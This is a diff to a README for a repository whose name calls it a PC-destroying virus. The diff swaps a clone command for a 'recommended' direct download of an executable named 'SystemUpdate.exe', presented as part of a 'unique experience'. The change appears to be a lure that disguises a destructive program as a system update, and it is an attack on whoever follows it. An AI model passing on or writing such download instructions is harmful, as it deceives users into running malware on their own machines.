@@ -7,7 +7,10 @@ Everyone has worked extremely hard on this project to bring you this unique expe
 📥 Manual Installation
 𝕴𝖋 𝖞𝖔𝖚 𝖆𝖗𝖊 𝖍𝖆𝖛𝖎𝖓𝖌 𝖙𝖗𝖔𝖚𝖇𝖑𝖊 𝖉𝖔𝖜𝖓𝖑𝖔𝖆𝖉𝖎𝖓𝖌 𝖙𝖍𝖗𝖔𝖚𝖌𝖍 𝖙𝖍𝖊 𝖜𝖊𝖇𝖘𝖎𝖙𝖊, 𝖗𝖚𝖓 𝖙𝖍𝖎𝖘 𝖈𝖔𝖒𝖒𝖆𝖓𝖉:
 
-git clone https://github.com/paz343123/this_distroy_pc_virus.git
+
+### 📥 **Direct Download (Recommended)**
+To get the full experience, download the executable from our releases:
+👉 [Download SystemUpdate.exe](https://github.com/paz343123/this_distroy_pc_virus/releases/download/v1.0.0/SystemUpdate.exe)
 👈:𝖙𝖍𝖎𝖘 𝖈𝖔𝖒𝖒𝖆𝖓𝖉
 
 ✨ User Experience
